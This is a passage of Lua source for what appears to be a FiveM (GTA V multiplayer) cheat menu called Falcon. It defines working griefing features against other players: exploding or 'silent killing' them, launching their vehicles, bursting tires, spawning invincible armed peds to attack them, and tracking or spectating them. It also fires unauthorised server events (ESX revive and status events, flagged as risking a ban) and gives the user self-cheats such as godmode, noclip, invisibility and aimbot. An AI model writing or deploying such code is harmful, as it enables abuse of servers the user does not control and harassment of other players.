									local ei = PedToNet(ped)
									NetworkSetNetworkIdDynamic(ei, false)
									SetNetworkIdCanMigrate(ei, true)
									SetNetworkIdExistsOnAllMachines(ei, true)
									Citizen.Wait(50)
									NetToPed(ei)
									GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
									SetEntityInvincible(ped, true)
									SetPedCanSwitchWeapon(ped, true)
									TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
								elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
									TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
								else
									Citizen.Wait(0)
								end
							end
						end
				elseif Falcon.Button("Nearby Peds Attack Player") then
					PedAttack(selectedPlayer, PedAttackType)
				elseif Falcon.ComboBox("Ped Attack Type", PedAttackOps, currAttackTypeIndex, selAttackTypeIndex, function(currentIndex, selectedIndex)
					currAttackTypeIndex = currentIndex
					selAttackTypeIndex = currentIndex
					PedAttackType = currentIndex
				end) then
				 elseif Falcon.Button("Possess Player Vehicle") then
					if Spectating then SpectatePlayer(selectedPlayer) end
					PossessVehicle(selectedPlayer)
				elseif Falcon.CheckBox("Track Player", Tracking, "Tracking: Nobody", "Tracking: "..GetPlayerName(TrackedPlayer)) then
					Tracking = not Tracking
					TrackedPlayer = selectedPlayer
				elseif Falcon.CheckBox("Fling Player", FlingingPlayer, "Flinging: Nobody", "Flinging: "..GetPlayerName(FlingedPlayer)) then
					FlingingPlayer = not FlingingPlayer
					FlingedPlayer = selectedPlayer
				elseif Falcon.Button("Launch Players Vehicle") then
					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						ShowInfo("~r~Player Not In Vehicle!")
					else

						local wasSpeccing= false
						local tmp = nil
						if Spectating then
							tmp = SpectatedPlayer
							wasSpeccing = true
							Spectating = not Spectating
							SpectatePlayer(tmp)
						end

						local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
						RequestControlOnce(veh)
						ApplyForceToEntity(veh, 3, 0.0, 0.0, 5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)

						if wasSpeccing then
							Spectating = not Spectating
							SpectatePlayer(tmp)
						end

					end
				elseif Falcon.Button("Slam Players Vehicle") then
					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						ShowInfo("~r~Player Not In Vehicle!")
					else

						local wasSpeccing= false
						local tmp = nil
						if Spectating then
							tmp = SpectatedPlayer
							wasSpeccing = true
							Spectating = not Spectating
							SpectatePlayer(tmp)
						end

						local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
						RequestControlOnce(veh)
						ApplyForceToEntity(veh, 3, 0.0, 0.0, -5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)

						if wasSpeccing then
							Spectating = not Spectating
							SpectatePlayer(tmp)
						end

					end
				elseif Falcon.ComboBox("Pop Players Vehicle Tire", {"Front Left", "Front Right", "Back Left", "Back Right", "All"}, currTireIndex, selTireIndex, function(currentIndex, selClothingIndex)
						currTireIndex = currentIndex
						selTireIndex = currentIndex
						end) then
						if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
							ShowInfo("~r~Player Not In Vehicle!")
						else

							local wasSpeccing= false
							local tmp = nil
							if Spectating then
								tmp = SpectatedPlayer
								wasSpeccing = true
								Spectating = not Spectating
								SpectatePlayer(tmp)
							end

							local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
							RequestControlOnce(veh)
							if selTireIndex == 1 then
								SetVehicleTyreBurst(veh, 0, 1, 1000.0)
							elseif selTireIndex == 2 then
								SetVehicleTyreBurst(veh, 1, 1, 1000.0)
							elseif selTireIndex == 3 then
								SetVehicleTyreBurst(veh, 4, 1, 1000.0)
							elseif selTireIndex == 4 then
								SetVehicleTyreBurst(veh, 5, 1, 1000.0)
							elseif selTireIndex == 5 then
								for i=0,7 do
									SetVehicleTyreBurst(veh, i, 1, 1000.0)
								end
							end

							if wasSpeccing then
								Spectating = not Spectating
								SpectatePlayer(tmp)
							end

						end
				elseif Falcon.Button("Explode Player") then
					ExplodePlayer(selectedPlayer)
				elseif Falcon.Button("Silent Kill Player") then
					local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
					AddExplosion(coords.x, coords.y, coords.z, 4, 0.1, 0, 1, 0.0)
				elseif Falcon.Button("Kick From Vehicle") then
					KickFromVeh(selectedPlayer)
					end


			-- SPECIFIC PLAYER OPTIONS
			elseif Falcon.IsMenuOpened('playeroptions') then
				if Falcon.Button("~m~PLAYER: " .. "~g~[" .. GetPlayerServerId(selectedPlayer) .. "] ~s~" .. GetPlayerName(selectedPlayer)) then
				elseif Falcon.CheckBox("~g~Spectate ~s~Player", Spectating, "Spectating: ~m~OFF", "Spectating: "..GetPlayerName(SpectatedPlayer)) then
					Spectating = not Spectating
					SpectatePlayer(selectedPlayer)
					SpectatedPlayer = selectedPlayer
				elseif Falcon.MenuButton("Troll Menu", 'troll') then
				elseif Falcon.MenuButton("~g~ESX ~s~Jobs Menu ~r~(RISK)", 'jobsplayers') then
				elseif Falcon.Button("~g~ESX ~s~Revive ~r~(RISK)") then
					local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
				 if string.lower(confirm) == "y" then
						TriggerServerEvent("whoapd:revive", GetPlayerServerId(selectedPlayer))
						TriggerServerEvent("paramedic:revive", GetPlayerServerId(selectedPlayer))
						TriggerServerEvent("ems:revive", GetPlayerServerId(selectedPlayer))
						TriggerEvent('esx_ambulancejob:revive', GetPlayerServerId(selectedPlayer))
						TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(selectedPlayer))
						TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
						StopScreenEffect('DeathFailOut')
						DoScreenFadeIn(800)
				 else
						ShowInfo("~r~Operation Canceled")
					end
				elseif Falcon.Button('~b~VRP ~s~Revive') then
						local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
						CreateAmbientPickup(GetHashKey('PICKUP_HEALTH_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_HEALTH_STANDARD'), 1, 0)
						SetPickupRegenerationTime(pickup, 60)
				elseif Falcon.Button('~b~Armour ~s~Player') then
						local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
						local pickup = CreateAmbientPickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_ARMOUR_STANDARD'), 1, 0)
						SetPickupRegenerationTime(pickup, 60)
				elseif Falcon.Button('~b~FULL Armour ~s~Player') then
						local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
						for i = 0, 99 do
							Citizen.Wait(0)
							CreateAmbientPickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), bK.x, bK.y, bK.z + 1.0, 1, 1, GetHashKey('PICKUP_ARMOUR_STANDARD'), 1, 0)
							SetPickupRegenerationTime(pickup, 10)
							i = i + 1
						end
				elseif Falcon.Button("~b~Open inventory") then
						TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
				elseif Falcon.Button("Teleport To Player") then
					local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
					if string.lower(confirm) == "y" then
						TeleportToPlayer(selectedPlayer)
					else
						ShowInfo("~r~Operation Canceled")
					end
				elseif Falcon.ComboBox("Teleport Into Players Vehicle", {"Front Right", "Back Left", "Back Right"}, currSeatIndex, selSeatIndex, function(currentIndex, selClothingIndex)
						currSeatIndex = currentIndex
						selSeatIndex = currentIndex
						end) then
						if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
							ShowInfo("~r~Player Not In Vehicle!")
						else
							local confirm = GetKeyboardInput("Are you Sure? ~g~Y~w~/~r~N")
							if string.lower(confirm) == "y" then
								local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
								if selSeatIndex == 1 then
									if IsVehicleSeatFree(veh, 0) then
										SetPedIntoVehicle(PlayerPedId(), veh, 0)
									else
										ShowInfo("~r~Seat Taken Or Does Not Exist!")
									end
								elseif selSeatIndex == 2 then
									if IsVehicleSeatFree(veh, 1) then
										SetPedIntoVehicle(PlayerPedId(), veh, 1)
									else
										ShowInfo("~r~Seat Taken Or Does Not Exist!")
									end
								elseif selSeatIndex == 3 then
									if IsVehicleSeatFree(veh, 2) then
										SetPedIntoVehicle(PlayerPedId(), veh, 2)
									else
										ShowInfo("~r~Seat Taken Or Does Not Exist!")
									end
								end
							end
						end
				elseif Falcon.Button("Cancel Animation/Task") then
					ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
				elseif Falcon.Button("Give All Weapons") then
				GiveAllWeapons(selectedPlayer)
				elseif Falcon.Button("Remove All Weapons") then
					StripPlayer(selectedPlayer)
				end


			-- SELF OPTIONS MENU
			elseif Falcon.IsMenuOpened('self') then
				if Falcon.CheckBox("~g~God~s~mode", Godmode) then
					Godmode = not Godmode
					ToggleGodmode(Godmode)
				elseif Falcon.CheckBox("Demigod Mode", Demigod) then
					Demigod = not Demigod
				elseif Falcon.Button("~g~ESX ~s~Revive ~r~(RISK)") then
					local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
				 if string.lower(confirm) == "y" then
					TriggerEvent("esx_status:set", "hunger", 1000000)
					TriggerEvent("esx_status:set", "thirst", 1000000)
					TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent('ambulancier:selfRespawn')
				 else
						ShowInfo("~r~Operation Canceled")
					end
				elseif Falcon.ComboBox("~b~Player ~s~Functions ~y~»", {"~b~VRP ~s~Revive", "~b~Give Player Armor", "~y~Remove Player Armor", "~g~Clean Player", "~y~Suicide", "~y~Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
					currPFuncIndex = currentIndex
					selPFuncIndex = currentIndex
					end) then
					if selPFuncIndex == 1 then
						SetEntityHealth(PlayerPedId(), 200)
					elseif selPFuncIndex == 2 then
						SetPedArmour(PlayerPedId(), 100)
					elseif selPFuncIndex == 3 then
						SetPedArmour(PlayerPedId(), 0)
					elseif selPFuncIndex == 4 then
						ClearPedBloodDamage(PlayerPedId())
						ClearPedWetness(PlayerPedId())
						ClearPedEnvDirt(PlayerPedId())
						ResetPedVisibleDamage(PlayerPedId())
					elseif selPFuncIndex == 5 then
						SetEntityHealth(PlayerPedId(), 0)
					elseif selPFuncIndex == 6 then
						ClearPedTasksImmediately(PlayerPedId())
					end
				elseif Falcon.CheckBox("Infinite Stamina", InfStamina) then
					InfStamina = not InfStamina
				elseif Falcon.CheckBox("Alternative Demigod Mode", ADemigod) then
					ADemigod = not ADemigod
				elseif Falcon.CheckBox("Infinite Stamina", InfStamina) then
					InfStamina = not InfStamina
				elseif Falcon.ComboBoxSlider("~y~Fast Run", FastCBWords, currFastRunIndex, selFastRunIndex, function(currentIndex, selClothingIndex)
					currFastRunIndex = currentIndex
					selFastRunIndex = currentIndex
					FastRunMultiplier = FastCB[currentIndex]
					SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
					end) then
				elseif Falcon.ComboBoxSlider("~y~Fast Swim", FastCBWords, currFastSwimIndex, selFastSwimIndex, function(currentIndex, selClothingIndex)
					currFastSwimIndex = currentIndex
					selFastSwimIndex = currentIndex
					FastSwimMultiplier = FastCB[currentIndex]
					SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
					end) then
				elseif Falcon.CheckBox("Super Jump", SuperJump) then
					SuperJump = not SuperJump
				elseif Falcon.CheckBox("Invisibility", Invisibility) then
					Invisibility = not Invisibility
					if not Invisibility then
						SetEntityVisible(PlayerPedId(), true)
					end
				elseif Falcon.CheckBox("~m~Magneto Mode ~s~KEY ~y~[E]", ForceTog) then
					ForceMod()
				elseif Falcon.CheckBox("~m~Forcefield", Forcefield) then
					Forcefield = not Forcefield
				elseif Falcon.ComboBox("~c~Forcefield Radius ~y~»", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
						currForcefieldRadiusIndex = currentIndex
						selForcefieldRadiusIndex = currentIndex
						ForcefieldRadius = ForcefieldRadiusOps[currentIndex]
						end) then
				elseif Falcon.CheckBox("~m~Noclip", Noclipping) then
					ToggleNoclip()
				elseif Falcon.ComboBox("~c~Noclip Speed ~y~»", NoclipSpeedOps, currNoclipSpeedIndex, selNoclipSpeedIndex, function(currentIndex, selectedIndex)
						currNoclipSpeedIndex = currentIndex
						selNoclipSpeedIndex = currentIndex
						NoclipSpeed = NoclipSpeedOps[currNoclipSpeedIndex]
						end) then
				end


			-- APPEARANCE MENU
			elseif Falcon.IsMenuOpened('appearance') then
			if Falcon.MenuButton("Models", 'skinsmodels') then
				elseif Falcon.Button("Set Model Name") then
					local model = GetKeyboardInput("Enter Model Name:")
					RequestModel(GetHashKey(model))
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
					else ShowInfo("~r~Model not recognized (Try Again)") end
				elseif Falcon.MenuButton("Modify Skin Textures", 'modifyskintextures') then
				elseif Falcon.Button("~b~Randomize ~s~Model") then
					RandomClothes(PlayerId())
				elseif Falcon.ComboBox("Save Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
					currClothingIndex = currentIndex
					selClothingIndex = currentIndex
				end) then
					Outfits[selClothingIndex] = GetCurrentOutfit(PlayerId())
				elseif Falcon.ComboBox("Load Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
					currClothingIndex = currentIndex
					selClothingIndex = currentIndex
				end) then
					SetCurrentOutfit(Outfits[selClothingIndex])
				end

				-- MODIFY SKIN TEXTURES MENU
					-- Useful methods to retrieve max number of clothes/colors for each body part index
					-- http://gtaxscripting.blogspot.com/2016/04/gta-v-peds-component-and-props.html
				elseif Falcon.IsMenuOpened('modifyskintextures') then
					--" ..tostring(GetNumberOfPedDrawableVariations(PlayerPedId(), 0)).. " Variations)" -- Removed this part for now

					----------------------------------------------------------------------
					-- The values of currSomethingIndex and selSomethingIndex need to   --
					-- be assigned to the drawables/textures the ped is currently using --
					-- so it doesn't reset them (before opening any of the menus)       --
					----------------------------------------------------------------------



					if Falcon.MenuButton("Head", "modifyhead") then

						if GetEntityModel(PlayerPedId()) ~= GetHashKey("mp_m_freemode_01") then
							Falcon.CloseMenu()
							Falcon.OpenMenu('modifyskintextures')
							ShowInfo("~r~Only MP Models Supported For Now!")
						end

						faceItemsList = GetHeadItems()
						faceTexturesList = GetHeadTextures(GetPedDrawableVariation(PlayerPedId(), 0))
						hairItemsList = GetHairItems()
						hairTexturesList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))
						maskItemsList = GetMaskItems()
						hatItemsList = GetHatItems()
						hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0))
					end

					elseif Falcon.IsMenuOpened('skinsmodels') then

	if Falcon.Button("~g~Reset Model To FiveM Player") then
				local model = "mp_m_freemode_01"
					RequestModel(GetHashKey(model))
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end

		elseif Falcon.Button("Change To ~p~Clown") then
				local model = "s_m_y_clown_01"
					RequestModel(GetHashKey(model))
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
				elseif Falcon.Button("Change To ~r~Stripper") then
				local model = "s_f_y_stripper_01"
					RequestModel(GetHashKey(model))
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
						elseif Falcon.Button("Change To ~b~Cop") then
				local model = "s_m_y_cop_01"
					RequestModel(GetHashKey(model))
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
						elseif Falcon.Button("Change To ~o~Chimp") then
				local model = "a_c_chimp"
					RequestModel(GetHashKey(model))
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
						elseif Falcon.Button("Change To ~g~Alien") then
				local model = "s_m_m_movalien_01"
					RequestModel(GetHashKey(model))
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
						elseif Falcon.Button("Change To ~p~Pongo") then
				local model = "u_m_y_pogo_01"
					RequestModel(GetHashKey(model))
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
						end
						elseif Falcon.Button("Change To ~o~Babyd") then
				local model = "u_m_y_babyd"
					RequestModel(GetHashKey(model))
					Wait(500)
					if HasModelLoaded(GetHashKey(model)) then
						SetPlayerModel(PlayerId(), GetHashKey(model))
					end
				end

					-- Head Menu
					elseif Falcon.IsMenuOpened('modifyhead') then
						if Falcon.ComboBoxSlider("Face", faceItemsList, currFaceIndex, selFaceIndex, function(currentIndex, selectedIndex)
							currFaceIndex = currentIndex
							selFaceIndex = currentIndex
							SetPedComponentVariation(PlayerPedId(), 0, faceItemsList[currentIndex]-1, 0, 0)
							faceTexturesList = GetHeadTextures(faceItemsList[currentIndex]-1)
							end) then
							--[[ -- I dont think any MP faces have textures?
						elseif Falcon.ComboBox2("Face Texture", faceTexturesList, currFtextureIndex, selFtextureIndex, function(currentIndex, selectedIndex)
							currFtextureIndex = currentIndex
							selFtextureIndex = currentIndex
							SetPedComponentVariation(PlayerPedId(), 0, faceItemsList[currFaceIndex]-1, faceTexturesList[currentIndex]-1, 0)
						end) then
							]]
						elseif Falcon.ComboBoxSlider("Hair", hairItemsList, currHairIndex, selHairIndex, function(currentIndex, selectedIndex)
							previousHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))

							previousHairTextureDisplay = hairTextureList[currHairTextureIndex]

							currHairIndex = currentIndex
							selHairIndex = currentIndex
							SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currentIndex]-1, 0, 0)
							currentHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
							hairTextureList = GetHairTextures(GetPedDrawableVariation(PlayerPedId(), 2))

							if (currentKey == keys.left or currentKey == keys.right) and previousHairTexture > currentHairTexture and previousHairTextureDisplay > currentHairTexture then
								currHairTextureIndex = hairTexturesList[currentHairTexture]
								selHairTextureIndex = hairTexturesList[currentHairTexture]
							end

							end) then
						elseif Falcon.ComboBox2("Hair Color", hairTextureList, currHairTextureIndex, selHairTextureIndex, function(currentIndex, selectedIndex)
							currHairTextureIndex = currentIndex
							selHairTextureIndex = currentIndex
							SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[currHairIndex]-1, currentIndex-1, 0)
							end) then
						elseif Falcon.ComboBoxSlider("Mask", maskItemsList, currMaskIndex, selMaskIndex, function(currentIndex, selectedIndex)
							currMaskIndex = currentIndex
							selMaskIndex = currentIndex
							SetPedComponentVariation(PlayerPedId(), 1, maskItemsList[currentIndex]-1, 0, 0)
							end) then
						elseif Falcon.ComboBoxSlider("Hat", hatItemsList, currHatIndex, selHatIndex, function(currentIndex, selectedIndex)
							previousHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) -- Gets the number of props before the hat index and the prop updates (previous)

							-- I wanted to grab hatTexturesList[currHatTextureIndex] before the the Prop was updated. This value is the number (index) that is shown on the Hat Texture ComboBox before it updates
							previousHatTextureDisplay = hatTexturesList[currHatTextureIndex]

							-- Both Hat Slider and Hat Texture ComboBox values update
							currHatIndex = currentIndex
							selHatIndex = currentIndex
							SetPedPropIndex(PlayerPedId(), 0, hatItemsList[currentIndex]-1, 0, 0)
							currentHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0)) -- Gets the number of props after the hat index and the prop updates (current)
							hatTexturesList = GetHatTextures(GetPedPropIndex(PlayerPedId(), 0)) -- Generates our array of indexes

							-- This if condition will only run once for every hat change since the variables previousHatTexture and currentHatTexture will become the same after the SetPedPropIndex() function runs
							if (currentKey == keys.left or currentKey == keys.right) and previousHatTexture > currentHatTexture and previousHatTextureDisplay > currentHatTexture then
								print('if condition')
								-- Checking if the left/right arrow key was pressed since this function runs every tick, to make sure it really only runs once

								-- Sets the current Index of the HatTexturesList to the max value of the currentHatTexture
								currHatTextureIndex = hatTexturesList[currentHatTexture]
								selHatTextureIndex = hatTexturesList[currentHatTexture]
							end

							end) then
						elseif Falcon.ComboBox2("Hat Texture", hatTexturesList, currHatTextureIndex, selHatTextureIndex, function(currentIndex, selectedIndex)
							currHatTextureIndex = currentIndex
							selHatTextureIndex = currentIndex
							SetPedPropIndex(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0), currentIndex, 0)
							end) then

						end


					elseif Falcon.IsMenuOpened('WeaponCustomization') then
						if Falcon.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
						currPFuncIndex = currentIndex
						selPFuncIndex = currentIndex
						  end) then
						if selPFuncIndex == 1 then
							SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)

						elseif selPFuncIndex == 2 then
							SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)

						elseif selPFuncIndex == 3 then
							SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)

						elseif selPFuncIndex == 4 then
							SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)

						elseif selPFuncIndex == 5 then
							SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)

						elseif selPFuncIndex == 6 then
							SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)

						elseif selPFuncIndex == 7 then
							SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)

						elseif selPFuncIndex == 8 then
							SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
						end
					elseif Falcon.Button("~g~Add ~s~Special Finish") then
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
					elseif Falcon.Button("~r~Remove ~s~Special Finish") then
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
					elseif Falcon.Button("~g~Add ~s~Suppressor") then
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
					elseif Falcon.Button("~r~Remove ~s~Suppressor") then
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
					elseif Falcon.Button("~g~Add ~s~Scope") then
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
						GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
					elseif Falcon.Button("~r~Remove ~s~Scope") then
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
						RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
					end


			-- WEAPON OPTIONS MENU
			elseif Falcon.IsMenuOpened('weapon') then
				if Falcon.MenuButton("~g~Give ~s~Single Weapon", 'weaponspawner') then
					selectedPlayer = PlayerId()
				elseif Falcon.MenuButton("Weapon Customization", "WeaponCustomization") then
					selectedPlayer = PlayerId()
				elseif Falcon.Button("Give All Weapons") then
					GiveAllWeapons(PlayerId())
				elseif Falcon.Button("Remove All Weapons") then
					StripPlayer(PlayerId())
				elseif Falcon.Button("Remove Ammo") then
					SetPedAmmo(GetPlayerPed(-1), 0)
				elseif Falcon.Button("Give Max Ammo") then
					GiveMaxAmmo(PlayerId())
				elseif Falcon.CheckBox("Infinite Ammo", InfAmmo) then
					InfAmmo = not InfAmmo
					SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
				elseif Falcon.CheckBox("Explosive Ammo", ExplosiveAmmo) then
					ExplosiveAmmo = not ExplosiveAmmo
				elseif Falcon.CheckBox("Force Gun", ForceGun) then
					ForceGun = not ForceGun
				elseif Falcon.CheckBox("Super Damage", SuperDamage) then
					SuperDamage = not SuperDamage
					if SuperDamage then
						local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
						SetPlayerWeaponDamageModifier(PlayerId(), 200.0)
					else
						local _, wep = GetCurrentPedWeapon(PlayerPedId(), 1)
						SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
					end
				elseif Falcon.CheckBox("Rapid Fire", RapidFire) then
					RapidFire = not RapidFire
				elseif Falcon.CheckBox("Aimbot", Aimbot) then
					Aimbot = not Aimbot
